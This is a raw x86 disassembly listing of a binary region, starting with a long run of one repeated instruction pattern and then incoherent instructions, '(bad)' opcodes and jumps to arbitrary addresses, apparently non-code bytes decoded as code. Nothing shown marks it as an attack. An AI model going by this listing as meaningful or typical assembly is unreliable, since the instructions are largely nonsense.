  42335c:	stos   DWORD PTR es:[edi],eax
  42335d:	or     BYTE PTR [edx+0x1],bl
  423360:	pop    edi
  423361:	loopne 0x42331f
  423363:	push   ebx
  423364:	pusha  
  423365:	hlt    
  423366:	pop    ebx
  423367:	mov    ch,0xee
  423369:	stos   DWORD PTR es:[edi],eax
  42336a:	or     BYTE PTR [edx+0x1],bl
  42336d:	pop    edi
  42336e:	loopne 0x42332c
  423370:	push   ebx
  423371:	pusha  
  423372:	hlt    
  423373:	pop    ebx
  423374:	mov    ch,0xee
  423376:	stos   DWORD PTR es:[edi],eax
  423377:	or     BYTE PTR [edx+0x1],bl
  42337a:	pop    edi
  42337b:	loopne 0x423339
  42337d:	push   ebx
  42337e:	pusha  
  42337f:	hlt    
  423380:	pop    ebx
  423381:	mov    ch,0xee
  423383:	stos   DWORD PTR es:[edi],eax
  423384:	or     BYTE PTR [edx+0x1],bl
  423387:	pop    edi
  423388:	loopne 0x423346
  42338a:	push   ebx
  42338b:	pusha  
  42338c:	hlt    
  42338d:	pop    ebx
  42338e:	mov    ch,0xee
  423390:	stos   DWORD PTR es:[edi],eax
  423391:	or     BYTE PTR [edx+0x1],bl
  423394:	pop    edi
  423395:	loopne 0x423353
  423397:	push   ebx
  423398:	pusha  
  423399:	hlt    
  42339a:	pop    ebx
  42339b:	mov    ch,0xee
  42339d:	stos   DWORD PTR es:[edi],eax
  42339e:	or     BYTE PTR [edx+0x1],bl
  4233a1:	pop    edi
  4233a2:	loopne 0x423360
  4233a4:	push   ebx
  4233a5:	pusha  
  4233a6:	hlt    
  4233a7:	pop    ebx
  4233a8:	mov    ch,0xee
  4233aa:	stos   DWORD PTR es:[edi],eax
  4233ab:	or     BYTE PTR [edx+0x1],bl
  4233ae:	pop    edi
  4233af:	loopne 0x42336d
  4233b1:	push   ebx
  4233b2:	pusha  
  4233b3:	hlt    
  4233b4:	pop    ebx
  4233b5:	mov    ch,0xee
  4233b7:	stos   DWORD PTR es:[edi],eax
  4233b8:	or     BYTE PTR [edx+0x1],bl
  4233bb:	pop    edi
  4233bc:	loopne 0x42337a
  4233be:	push   ebx
  4233bf:	pusha  
  4233c0:	hlt    
  4233c1:	pop    ebx
  4233c2:	mov    ch,0xee
  4233c4:	stos   DWORD PTR es:[edi],eax
  4233c5:	or     BYTE PTR [edx+0x1],bl
  4233c8:	pop    edi
  4233c9:	loopne 0x423387
  4233cb:	push   ebx
  4233cc:	pusha  
  4233cd:	hlt    
  4233ce:	pop    ebx
  4233cf:	mov    ch,0xee
  4233d1:	stos   DWORD PTR es:[edi],eax
  4233d2:	or     BYTE PTR ds:0x93e055ef,bl
  4233d8:	push   ebx
  4233d9:	pusha  
  4233da:	in     al,0x5b
  4233dc:	mov    ch,0xc4
  4233de:	or     edx,edx
  4233e0:	sub    esp,DWORD PTR [edi-0x60]
  4233e3:	int    0x22
  4233e5:	aam    0x30
  4233e7:	sbb    DWORD PTR [ebp+0x5d],ebp
  4233ea:	std    
  4233eb:	pop    ds
  4233ec:	popf   
  4233ed:	cmp    al,0x70
  4233ef:	fstp   TBYTE PTR [edx-0x1d281d51]
  4233f5:	ss push ecx
  4233f7:	fs sub cl,dh
  4233fa:	je     0x42345f
  4233fc:	iret   
  4233fd:	fild   WORD PTR [ebp+0x4c452f60]
  423403:	xchg   edi,eax
  423404:	out    dx,al
  423405:	mov    WORD PTR [edi-0x72f1ab2e],gs
  42340b:	adc    eax,0x4f295d61
  423410:	add    al,0x8e
  423412:	mov    ebx,0xb0107c53
  423417:	mov    DWORD PTR ds:0x774e873f,ebx
  42341d:	jb     0x423482
  42341f:	push   esi
  423421:	ins    BYTE PTR es:[edi],dx
  423422:	jno    0x4233b6
  423424:	jns    0x4233e4
  423426:	repz test eax,0xd1ccccf0
  42342c:	mov    bh,0x7d
  42342e:	inc    edi
  42342f:	mov    al,0xf1
  423431:	aaa    
  423432:	daa    
  423433:	mov    esp,DWORD PTR [edi]
  423435:	mov    esi,0xc7e3fc57
  42343a:	mov    dl,0xd0
  42343c:	or     al,0x17
  42343e:	push   ds
  42343f:	pop    edx
  423440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423441:	pop    ebp
  423442:	(bad)  
  423443:	ds jecxz 0x42349e
  423446:	push   0x89619a96
  42344b:	stos   DWORD PTR es:[edi],eax
  42344c:	push   DWORD PTR [edi-0x174e27e]
  423452:	ins    DWORD PTR es:[edi],dx
  423453:	jae    0x423478
  423455:	cli    
  423456:	add    eax,0x17226bb4
  42345b:	and    BYTE PTR [ebx],0x29
  42345e:	xchg   esi,eax
  42345f:	jmp    0x20cd0fea
  423464:	cmp    bh,BYTE PTR [edx+0x77316df4]
  42346a:	xchg   edi,eax
  42346b:	idiv   BYTE PTR [edx]
  42346d:	inc    eax
  42346e:	or     dh,BYTE PTR [edx-0x13dd6a25]
  423474:	jle    0x4234bc
  423476:	mov    edx,0x4f938eed
  42347b:	retf   
  42347c:	in     eax,0x84
  42347e:	movd   edi,mm3
  423481:	popa   
  423482:	dec    ebx
  423483:	inc    ebp
  423484:	lods   al,BYTE PTR ds:[esi]
  423485:	pop    edx
  423486:	adc    edx,DWORD PTR [edx-0x11]
  423489:	test   eax,0xd4ba948f
  42348e:	jle    0x42349a
  423490:	lock mov eax,ds:0x902da93b
  423496:	pusha  
  423497:	lahf   
  423498:	test   eax,0x69fa3ae9
  42349d:	and    DWORD PTR [ebp-0x2384b6ea],edx
  4234a3:	inc    esp
  4234a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234a5:	jge    0x4234e1
  4234a7:	mov    BYTE PTR fs:[eax+eax*8+0x69],bl
  4234ac:	pop    ecx
  4234ad:	lea    ebx,[ebx]
  4234af:	addr16 dec ebx
  4234b1:	jecxz  0x4234f5
  4234b3:	fwait
  4234b4:	call   0x76a76740
  4234b9:	and    eax,0xde9ff9d7
  4234be:	retf   0x468c
  4234c1:	addr16 adc al,0x4b
  4234c4:	scas   eax,DWORD PTR es:[edi]
  4234c5:	enter  0x5c71,0x59
  4234c9:	mov    al,ds:0xe3e3dae8
  4234ce:	out    0x30,eax
  4234d0:	xor    ecx,DWORD PTR [edi+0x5d]
  4234d3:	xor    al,0xa0
  4234d5:	xor    al,0x91
  4234d7:	cmp    DWORD PTR [edi],ebx
  4234d9:	and    ah,bl
  4234db:	xor    edi,DWORD PTR [eax-0x35]
  4234de:	cmp    ebx,DWORD PTR [esi]
  4234e0:	outs   dx,DWORD PTR ds:[esi]
  4234e1:	fmul   st(5),st
  4234e3:	dec    esi
  4234e4:	adc    eax,0xba7774a6
  4234e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234ea:	loope  0x42350f
  4234ec:	lds    ebx,FWORD PTR [edi+0x70243a7f]
  4234f2:	push   ecx
  4234f3:	sbb    bl,bl
  4234f5:	and    bh,BYTE PTR [edi+esi*2+0x53a6b567]
  4234fc:	imul   ecx,DWORD PTR [edx],0xffffffa6
  4234ff:	test   edx,0x91b16f84
  423505:	nop
  423506:	inc    edx
  423507:	or     al,0x3
  423509:	push   edx
  42350a:	dec    ebp
  42350b:	or     cl,bh
  42350d:	add    ax,0xacb6
  423511:	dec    esp
  423512:	sub    BYTE PTR [ebx-0x40],0x4
  423516:	dec    edx
  423517:	push   ecx
  423518:	scas   eax,DWORD PTR es:[edi]
  423519:	neg    DWORD PTR [esi+esi*1+0x5d3213bb]
  423520:	xor    eax,DWORD PTR [ebp-0x20]
  423523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423524:	xor    al,0x4f
  423526:	inc    esp
  423527:	insertq xmm0,xmm6,0xb6,0xbf
  42352d:	test   al,0x48
  42352f:	nop
  423530:	or     eax,0x76f6e4f9
  423535:	push   edx
  423536:	jge    0x42356f
  423538:	neg    BYTE PTR [ecx]
  42353a:	clc    
  42353b:	inc    esp
  42353c:	fmul   DWORD PTR [esi-0x18]
  42353f:	loop   0x423594
  423541:	xlat   BYTE PTR ds:[ebx]
  423542:	(bad)  
  423543:	bswap  eax
  423545:	mov    edi,?
  423547:	jmp    0x1b7a1936
  42354c:	stos   DWORD PTR es:[edi],eax
  42354d:	xchg   esp,eax
  42354e:	rcr    BYTE PTR [ebx+0x5a],0xa2
  423552:	mov    eax,ds:0xf18125d4
  423557:	cmc    
  423558:	xchg   edx,eax
  423559:	or     di,WORD PTR [esp+ecx*8]
  42355d:	pop    ebp
  42355e:	stc    
  42355f:	sub    dl,BYTE PTR [eax+0x56f1c666]
  423565:	call   0x9795:0x9e854c80
  42356c:	xor    ah,BYTE PTR [eax-0x1c]
  42356f:	ins    BYTE PTR es:[edi],dx
  423570:	mov    DWORD PTR [ecx+eax*8],ebp
  423573:	stos   BYTE PTR es:[edi],al
  423574:	addr16 call 0xa1f2d693
  42357a:	dec    ecx
  42357b:	int3   
  42357c:	std    
  42357d:	xchg   edx,eax
  42357e:	add    edi,DWORD PTR [esi]
  423580:	(bad)  
  423582:	in     eax,0xf5
  423584:	or     eax,DWORD PTR [eax+0xe]
  423587:	sub    eax,0x6446300c
  42358c:	jae    0x4235cb
  42358e:	sub    eax,0xfd63155f
  423593:	or     bl,dh
  423595:	jmp    0xd19c36dd
  42359a:	js     0x42355b
  42359c:	das    
  42359d:	inc    esi
  42359e:	dec    eax
  42359f:	loopne 0x423568
  4235a1:	cmp    dh,ch
  4235a3:	xchg   ecx,eax
  4235a4:	and    al,BYTE PTR [eax+0x45e54683]
  4235aa:	push   0xc65dd161
  4235af:	lods   al,BYTE PTR ds:[esi]
  4235b0:	cld    
  4235b1:	dec    ebx
  4235b2:	mov    ds:0x41e0e217,al
  4235b7:	sahf   
  4235b8:	dec    ecx
  4235b9:	psrld  mm0,QWORD PTR [eax]
  4235bc:	rcr    DWORD PTR [eax+eiz*8],cl
  4235bf:	mov    edi,0xa755bacf
  4235c4:	jecxz  0x42354c
  4235c6:	dec    esi
  4235c7:	imul   ecx,DWORD PTR [esp+ecx*8+0x46efe1da],0x3c
  4235cf:	adc    al,0x33
  4235d1:	push   0x2868714b
  4235d6:	push   es
  4235d7:	xchg   BYTE PTR [edi],dl
  4235d9:	cmp    eax,0x9f1de664
  4235de:	test   DWORD PTR [edi-0x4fa34bb8],0x7ded7b32
  4235e8:	xor    esp,DWORD PTR [esp+ebx*4-0x60815d84]
  4235ef:	cmp    edi,DWORD PTR [eax-0x18f5ce64]
  4235f5:	xor    BYTE PTR [edx+0x456d188e],bh
  4235fb:	jecxz  0x42360d
  4235fd:	nop
  4235fe:	inc    esp
  4235ff:	dec    esi
  423600:	mov    al,0x1c
  423602:	ss jl  0x42361b
  423605:	mov    dh,0xf6
  423607:	push   esi
  423608:	xlat   BYTE PTR ds:[ebx]
  423609:	dec    esi
  42360a:	ss repnz pop ss
  42360d:	in     eax,dx
  42360e:	push   edi
  42360f:	push   ebp
  423610:	enter  0xe6c5,0xad
  423614:	sub    al,0xc
  423616:	push   eax
  423617:	aaa    
  423618:	jge    0x423686
  42361a:	mul    DWORD PTR [edx-0x5b14e56d]
  423620:	out    dx,eax
  423621:	loop   0x423651
  423623:	pop    ds
  423624:	adc    edx,0x8705bd23
  42362a:	xchg   DWORD PTR [esp+ebp*2+0x41],ebx
  42362e:	cmp    eax,0x94743d32
  423633:	xchg   ebx,eax
  423634:	xchg   esi,eax
  423635:	ins    DWORD PTR es:[edi],dx
  423636:	jmp    0x42361a
  423638:	sub    bl,BYTE PTR ds:0x68f0eb62
  42363e:	leave  
  42363f:	push   0x6734a253
  423644:	ret    
  423645:	test   BYTE PTR [ecx],0x61
  423648:	lods   eax,DWORD PTR ds:[esi]
  423649:	or     esi,DWORD PTR [edi]
  42364b:	push   cs
  42364c:	inc    eax
  42364d:	out    dx,eax
  42364e:	xchg   edi,eax
  42364f:	xchg   ecx,eax
  423650:	jo     0x42368b
  423652:	xor    DWORD PTR [edi],eax
  423654:	int3   
  423655:	ror    BYTE PTR [ebx+0x2b894b17],0x86
  42365c:	loop   0x42367f
  42365e:	jmp    0x3c0daeb5
  423663:	stc    
  423664:	mov    al,ds:0x3dac9e57
  423669:	xor    eax,0x75a4fb73
  42366e:	lea    eax,[edi]
  423670:	mov    ebp,0xff202ad1
  423675:	push   cs
  423676:	xor    DWORD PTR [edi+ebp*8-0x7085b0b9],ebx
  42367d:	stc    
  42367e:	jp     0x42363f
  423680:	dec    edi
  423681:	push   0x7c
  423683:	adc    ebp,DWORD PTR [esi+0x15]
  423686:	cmp    al,0x44
  423688:	inc    edi
  423689:	in     eax,dx
  42368a:	int3   
  42368b:	in     al,0xca
  42368d:	push   cs
  42368e:	cmp    eax,0xe2437e4e
  423693:	into   
  423694:	or     eax,0x42e878b7
  423699:	scas   al,BYTE PTR es:[edi]
  42369a:	inc    edi
  42369b:	mov    ecx,ecx
  42369d:	loop   0x4236d9
  42369f:	xor    ecx,DWORD PTR [eax+0x4ab7007b]
  4236a5:	cmp    BYTE PTR [ebx],dl
  4236a7:	push   ds
  4236a8:	mov    WORD PTR gs:[edx],cs
  4236ab:	out    0x44,al
  4236ad:	shl    BYTE PTR [ebx-0x10df07c5],cl
  4236b3:	stc    
  4236b4:	inc    edx
  4236b5:	loope  0x4236db
  4236b7:	gs inc esi
  4236b9:	clc    
  4236ba:	cld    
  4236bb:	sbb    cl,dl
  4236bd:	pop    ds
  4236be:	xchg   ebp,eax
  4236bf:	add    al,0x7
  4236c1:	bound  esp,QWORD PTR [edx]
  4236c3:	or     al,0x80
  4236c5:	mov    ah,0x46
  4236c7:	xchg   ebx,eax
  4236c8:	fsubr  QWORD PTR [ecx+0x18]
  4236cb:	dec    esi
  4236cc:	gs or  bh,ch
  4236cf:	sti    
  4236d0:	repnz and ch,BYTE PTR [ecx+0xe9bd4a1]
  4236d7:	push   esp
  4236d8:	sbb    bl,BYTE PTR [edx-0xe]
  4236db:	ret    
  4236dc:	push   0x6bd55124
  4236e1:	in     ax,dx
  4236e3:	cmp    eax,0x4de4628e
  4236e8:	jns    0x423758
  4236ea:	dec    ebx
  4236eb:	popa   
  4236ec:	add    esp,DWORD PTR [edx+0x7dc76203]
  4236f2:	aaa    
  4236f3:	sbb    esi,DWORD PTR [edx+0x2]
  4236f6:	mov    al,ds:0xb822483c
  4236fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236fd:	test   al,0x53
  4236ff:	or     al,0x77
  423701:	push   edi
  423702:	inc    esi
  423703:	inc    esi
  423704:	adc    eax,0xa5277454
  423709:	js     0x423702
  42370b:	retf   
  42370c:	fsub   st(5),st
  42370e:	lods   eax,DWORD PTR ds:[esi]
  42370f:	push   edi
  423710:	call   0xf204e4a0
  423715:	in     al,0xe6
  423717:	adc    al,0xdc
  423719:	xchg   esi,eax
  42371a:	lods   al,BYTE PTR ds:[esi]
  42371b:	jge    0x42376f
  42371d:	std    
  42371e:	call   0x7fc0:0x2ae39526
  423725:	xchg   edx,eax
  423726:	xor    edx,DWORD PTR [ebp+0x6c]
  423729:	lods   al,BYTE PTR ds:[esi]
  42372a:	div    BYTE PTR [eax-0xd]
  42372d:	mov    ds:0xe92bcf12,al
  423732:	push   ds
  423733:	jle    0x423798
  423735:	inc    esi
  423736:	jp     0x4237a1
  423738:	in     al,0x84
  42373a:	mov    ah,0x2a
  42373c:	test   BYTE PTR [edx+0x5d],dh
  42373f:	inc    edx
  423740:	jbe    0x423785
  423742:	jae    0x4236e4
  423744:	xor    BYTE PTR [ecx],dl
  423746:	mov    dh,0xd1
  423748:	jno    0x423744
  42374a:	cmp    eax,0xec5612f2
  42374f:	fnstcw WORD PTR [esi+0x5d]
  423752:	xlat   BYTE PTR ds:[ebx]
  423753:	in     eax,dx
  423754:	(bad)  
  423755:	pusha  
  423756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423757:	adc    DWORD PTR [eax],0x9d292971
  42375d:	call   0x1a6faa3f
  423762:	jmp    0x1ebe:0xe57cbdcd
  423769:	je     0x42371e
  42376b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42376c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42376d:	push   0xffffffb5
  42376f:	push   eax
  423770:	fcomip st,st(7)
  423772:	mov    dl,0xd3
  423774:	push   cs
  423775:	or     BYTE PTR [esi+edi*4],cl
  423778:	push   es
  423779:	stos   DWORD PTR es:[edi],eax
  42377a:	in     eax,dx
  42377b:	dec    DWORD PTR [edi-0x5b]
  42377e:	sar    BYTE PTR [ebp-0x43cdd37b],1
  423784:	ins    BYTE PTR es:[edi],dx
  423785:	fwait
  423786:	sbb    al,0xf7
  423788:	popa   
  423789:	add    eax,DWORD PTR ds:0x3f7af5b2
  42378f:	add    eax,0x2c4cec50
  423794:	sub    ecx,esi
  423796:	adc    DWORD PTR [edi+0x2d],edi
  423799:	inc    esi
  42379a:	sahf   
  42379b:	sub    eax,0x7f2d0bfb
  4237a0:	(bad)  
  4237a1:	in     eax,0xa1
  4237a3:	cmc    
  4237a4:	or     eax,0x73ce8415
  4237a9:	aas    
  4237aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237ab:	xchg   ebp,eax
  4237ac:	pop    edx
  4237ad:	bound  esp,QWORD PTR [ebx-0x57b6a86e]
  4237b3:	mov    ah,0xf5
  4237b5:	cs pop eax
  4237b7:	mov    eax,esi
  4237b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237ba:	out    0xf5,eax
  4237bc:	es pop eax
  4237be:	test   BYTE PTR ds:0x2d7e298e,dl
  4237c4:	jne    0x4237a9
  4237c6:	add    bh,BYTE PTR [edi+0x6a719290]
  4237cc:	add    eax,DWORD PTR [ebx+0x28]
  4237cf:	sahf   
  4237d0:	mov    edx,0xe6abdc62
  4237d5:	mov    eax,0x1648e54e
  4237da:	mov    al,ds:0xf86bc461
  4237df:	sbb    BYTE PTR [ebx-0x3390f0e0],ch
  4237e5:	adc    DWORD PTR [esi],0xe565c17
  4237eb:	int3   
  4237ec:	xor    BYTE PTR [eax+0x6c],cl
  4237ef:	adc    DWORD PTR [ecx-0x70],0x67e8b04e
  4237f6:	push   cs
  4237f7:	mov    al,0xaa
  4237f9:	ret    
  4237fa:	gs cmp eax,0xaa3fb4e1
  423800:	shl    DWORD PTR [eax+0x26c819ef],1
  423806:	aam    0x8
  423808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423809:	mov    bl,BYTE PTR [ebp+0x5c]
  42380c:	addr16 sbb al,0x98
  42380f:	lods   eax,DWORD PTR ds:[esi]
  423810:	and    ebp,DWORD PTR [ebx-0x3672d22e]
  423816:	cli    
  423817:	jno    0x423833
  423819:	retf   0x7ec2
  42381c:	jl     0x423845
  42381e:	mov    DWORD PTR [edi],edi
  423820:	nop
  423821:	jno    0x42383c
  423823:	mov    cl,0xae
  423825:	pop    ebx
  423826:	xchg   ecx,eax
  423827:	leave  
  423828:	mov    ebx,0xebf725db
  42382d:	or     DWORD PTR [edx],ecx
  42382f:	pusha  
  423830:	jmp    0x30eb32e4
  423835:	mov    bh,0xd4
  423837:	mov    DWORD PTR [esi-0x1b],0xacf03864
  42383e:	loopne 0x423837
  423840:	inc    eax
  423841:	bound  eax,QWORD PTR [ecx-0x1fd3e965]
  423847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423848:	sub    al,0xa9
  42384a:	or     BYTE PTR [edx],al
  42384c:	sbb    ecx,0x3bfa1df7
  423852:	(bad)  [edx]
  423854:	repnz rol DWORD PTR [ecx],1
  423857:	adc    eax,DWORD PTR [esp+ebp*2+0x7b77d782]
  42385e:	fisttp QWORD PTR [edi-0x3823e0a1]
  423864:	xchg   edi,eax
  423865:	dec    esi
  423866:	adc    edx,edx
  423868:	push   0x4b7d99aa
  42386d:	or     al,0xb4
  42386f:	iret   
  423870:	adc    eax,0x1aa2c428
  423875:	and    DWORD PTR [ebx],ecx
  423877:	push   0xb9c480ec
  42387c:	mov    ch,0x95
  42387e:	je     0x423886
  423880:	shr    ecx,0x67
  423883:	outs   dx,DWORD PTR ds:[esi]
  423884:	sbb    al,0xe5
  423886:	enter  0xa11,0x22
  42388a:	push   0xffffffbc
  42388c:	cdq    
  42388d:	sbb    ebx,0xffffff92
  423890:	repz mov dh,0x50
  423893:	imul   ebp
  423895:	stc    
  423896:	call   0xd5f1:0x74747237
  42389d:	cld    
  42389e:	sbb    edi,DWORD PTR [esi-0x48]
  4238a1:	dec    ebp
  4238a2:	cdq    
  4238a3:	mov    bh,0x24
  4238a5:	sti    
  4238a6:	dec    edx
  4238a7:	mov    al,0x78
  4238a9:	push   eax
  4238aa:	retf   
  4238ab:	rcr    bl,1
  4238ad:	ins    DWORD PTR es:[edi],dx
  4238ae:	and    DWORD PTR [edx-0x6f638ffc],esp
  4238b4:	fld    st(5)
  4238b6:	mov    edi,DWORD PTR [ecx]
  4238b8:	inc    esi
  4238b9:	or     ch,0x2f
  4238bc:	iret   
  4238bd:	mov    WORD PTR [ecx],fs
  4238bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c0:	dec    ebx
  4238c1:	xchg   edi,eax
  4238c2:	mov    eax,ds:0xc187011
  4238c7:	mov    eax,ds:0x29a766b8
  4238cc:	pop    ebp
  4238cd:	xchg   edi,eax
  4238ce:	test   al,0x92
  4238d0:	outs   dx,BYTE PTR ds:[esi]
  4238d1:	cmp    edx,esi
  4238d3:	push   ds
  4238d4:	loop   0x423891
  4238d6:	push   cs
  4238d7:	xchg   esi,eax
  4238d8:	mov    al,ds:0xfcb61079
  4238dd:	aad    0x26
  4238df:	push   esi
  4238e0:	push   edx
  4238e1:	or     edx,ecx
  4238e3:	in     eax,dx
  4238e4:	mov    edx,0x8b972c0
  4238e9:	or     ch,BYTE PTR fs:[esi+esi*8]
  4238ed:	arpl   sp,dx
  4238ef:	cli    
  4238f0:	sti    
  4238f1:	outs   dx,DWORD PTR ds:[esi]
  4238f2:	add    eax,DWORD PTR [ebp-0xc]
  4238f5:	jnp    0x423908
  4238f7:	pop    ebp
  4238f8:	pop    esp
  4238f9:	push   ebx
  4238fa:	dec    edi
  4238fb:	pushf  
  4238fc:	push   ecx
  4238fd:	or     eax,0x924a2cc7
  423902:	inc    edi
  423903:	stos   DWORD PTR es:[edi],eax
  423904:	and    BYTE PTR [edx],ah
  423906:	(bad)
  42390a:	jl     0x4238e0
  42390c:	psrlw  mm7,mm2
  42390f:	jnp    0x423935
  423911:	ss pop esi
  423913:	cld    
  423914:	adc    esp,DWORD PTR [edi]
  423916:	xor    edi,edx
  423918:	push   cs
  423919:	cmp    DWORD PTR [eax-0x50efd834],ebx
  42391f:	sub    al,0xe3
  423921:	lds    ebx,FWORD PTR [ebx-0x1d]
  423924:	add    al,0xdc
  423926:	jae    0x423960
  423928:	dec    esp
  423929:	leave  
  42392a:	adc    eax,esp
  42392c:	sahf   
  42392d:	sbb    eax,0x32e0714a
  423932:	clc    
  423933:	mov    esi,0xeafe80cb
  423938:	outs   dx,DWORD PTR ds:[esi]
  423939:	add    al,ah
  42393b:	ss aam 0xb7
  42393e:	sub    eax,0xf10a06ce
  423943:	add    eax,0xb6c038bd
  423948:	jnp    0x4239c9
  42394a:	sahf   
  42394b:	add    eax,0x91f5c6cc
  423950:	mov    ecx,?
  423952:	test   al,0x4f
  423954:	push   esp
  423955:	jecxz  0x4239cb
  423957:	lock cmp ah,BYTE PTR [edi+eiz*1]
  42395b:	xchg   ecx,eax
  42395c:	mov    esi,eax
  42395e:	imul   edx,edi,0x7f
  423961:	icebp  
  423962:	add    BYTE PTR [esi-0x64],cl
  423965:	leave  
  423966:	and    al,0x2f
  423968:	sbb    DWORD PTR [esi-0x3],esi
  42396b:	ins    BYTE PTR es:[edi],dx
  42396c:	jp     0x4239c4
  42396e:	popa   
  42396f:	ds inc ebp
  423971:	inc    ebx
  423972:	cmp    eax,0x6eb450fc
  423977:	dec    ebp
  423978:	and    al,0x4f
  42397a:	pop    edx
  42397b:	imul   esp,DWORD PTR [ebx-0x6e],0xa4ef9035
  423982:	aas    
  423983:	mov    es,WORD PTR [eax]
  423985:	jo     0x4239ed
  423987:	push   edi
  423988:	mov    ebp,0x55d0ec09
  42398d:	call   0xc3baa0e1
  423992:	dec    ecx
  423993:	cld    
  423994:	aaa    
  423995:	cmp    al,0x78
  423997:	adc    cl,bh
  423999:	push   esi
  42399a:	push   esp
  42399b:	(bad)  
  42399c:	(bad)  
  42399d:	fstp   DWORD PTR [edi+0x1d]
  4239a0:	loop   0x4239dd
  4239a2:	jno    0x423998
  4239a4:	call   0x3a0e58d7
  4239a9:	aam    0x3d
  4239ab:	add    ch,BYTE PTR [edx+0x6c]
  4239ae:	add    al,0xe6
  4239b0:	pop    edi
  4239b1:	js     0x4239f5
  4239b3:	lds    ebx,FWORD PTR [esi]
  4239b5:	mov    ebx,0x9c9d2af8
  4239ba:	fwait
  4239bb:	stc    
  4239bc:	jp     0x4239a1
  4239be:	retf   0x403
  4239c1:	test   DWORD PTR ds:[esi+0x2b],edx
  4239c5:	sub    edx,DWORD PTR [esi+0x51f612e1]
  4239cb:	cmp    ebx,DWORD PTR [ebx+0x7e13a076]
  4239d1:	xor    DWORD PTR [ebp+0x73],0x834a0513
  4239d8:	aad    0x1b
  4239da:	ret    
  4239db:	outs   dx,BYTE PTR ds:[esi]
  4239dc:	gs and dh,al
  4239df:	scas   eax,DWORD PTR es:[edi]
  4239e0:	hlt    
  4239e1:	cmp    eax,0x4affb166
  4239e6:	or     DWORD PTR [edx],esi
  4239e8:	outs   dx,DWORD PTR ds:[esi]
  4239e9:	cwde   
  4239ea:	push   cs
  4239eb:	imul   ebx,DWORD PTR [esi],0x9d3fc94
  4239f1:	push   ds
  4239f2:	idiv   ecx
  4239f4:	inc    edx
  4239f5:	sbb    eax,edi
  4239f7:	ja     0x423995
  4239f9:	sti    
  4239fa:	jmp    0x4239d2
  4239fc:	mul    ch
  4239fe:	jae    0x423a58
  423a00:	aas    
  423a01:	repz jmp 0x2592:0xf6adffce
  423a09:	mov    esp,0x1039bb89
  423a0e:	icebp  
  423a0f:	sbb    esi,DWORD PTR [ecx+0x7f0cfa96]
  423a15:	mov    BYTE PTR [edx+0x2787b53d],ah
  423a1b:	xchg   BYTE PTR [ebx],ah
  423a1d:	dec    eax
  423a1e:	mov    al,0xf7
  423a20:	shl    BYTE PTR [edx],0xc7
  423a23:	int    0x92
  423a25:	scas   eax,DWORD PTR es:[edi]
  423a26:	dec    ebp
  423a27:	nop
  423a28:	inc    edx
  423a29:	mov    ebp,0xbdcaeeb4
  423a2e:	cwde   
  423a2f:	push   0x1b
  423a31:	and    DWORD PTR [ebp-0x319eb8b5],edx
  423a37:	mov    eax,ds:0x3ebbc447
  423a3c:	rcr    edx,0xc2
  423a3f:	inc    edx
  423a40:	(bad)  
  423a42:	repnz sar al,1
  423a45:	pop    esp
  423a46:	out    dx,eax
  423a47:	dec    ebx
  423a48:	cs out 0xea,al
  423a4b:	jle    0x4239f8
  423a4d:	cmc    
  423a4e:	in     al,dx
  423a4f:	xlat   BYTE PTR ds:[ebx]
  423a50:	dec    ecx
  423a51:	sbb    al,0xe3
  423a53:	sbb    DWORD PTR [ebp+0x36],eax
  423a56:	xchg   esi,eax
  423a57:	jmp    0x802e7697
  423a5c:	je     0x423a18
  423a5e:	bound  ebp,QWORD PTR [edi]
  423a60:	add    al,0x43
  423a62:	std    
  423a63:	dec    eax
  423a64:	pop    eax
  423a65:	mov    ebx,0xf7e7a801
  423a6a:	mov    ss,edx
  423a6c:	xchg   ecx,eax
  423a6d:	xchg   esp,eax
  423a6e:	out    0x8,eax
  423a70:	jecxz  0x423a66
  423a72:	int    0x16
  423a74:	or     ax,0xfa9
  423a78:	in     eax,0xf2
  423a7a:	pop    ss
  423a7b:	jo     0x423aee
  423a7d:	push   edi
  423a7e:	xor    BYTE PTR [edi+edi*2],al
  423a81:	adc    al,cl
  423a83:	xadd   BYTE PTR [edx-0x22],bh
  423a87:	adc    al,BYTE PTR [ecx-0x7af12d81]
  423a8d:	mov    ebp,0x42b275a2
  423a92:	mov    ecx,0x4f9b93bb
  423a97:	inc    ebx
  423a98:	arpl   WORD PTR [eax+0x66749e87],sp
  423a9e:	cli    
  423a9f:	fcomp  DWORD PTR [esi+0x24]
  423aa2:	data16 lahf 
  423aa4:	not    ah
  423aa6:	mov    edi,0x42c6a591
  423aab:	jl     0x423a31
  423aad:	cmp    esi,0x2b00caa8
  423ab3:	cdq    
  423ab4:	popa   
  423ab5:	loope  0x423af5
  423ab7:	push   edi
  423ab8:	scas   eax,DWORD PTR es:[edi]
  423ab9:	(bad)  
  423aba:	fdiv   QWORD PTR [ebx+0x15]
  423abd:	jb     0x423aff
  423abf:	add    dl,BYTE PTR [ecx+0x3ab930df]
  423ac5:	inc    edi
  423ac6:	xor    BYTE PTR [edi+eiz*1+0x2cb7d31f],ah
  423acd:	(bad)  
  423ace:	pop    ds
  423acf:	push   eax
  423ad0:	das    
  423ad1:	dec    eax
  423ad2:	and    DWORD PTR fs:[ecx-0x12e0963],esi
  423ad9:	repz sbb BYTE PTR [edx+0x674e83c7],bl
  423ae0:	in     al,0xae
  423ae2:	sub    dl,BYTE PTR [esi-0x36]
  423ae5:	fisttp QWORD PTR [edx-0x54]
  423ae8:	cmp    eax,0x2fd5fd08
  423aed:	sbb    ah,cl
  423aef:	arpl   WORD PTR [eax],cx
  423af1:	jmp    0xfd56:0x1df75676
  423af8:	cdq    
  423af9:	imul   DWORD PTR [edx+0x4056b4bb]
  423aff:	lock push 0xffffff9d
  423b02:	rcr    BYTE PTR [esi-0x2e651412],cl
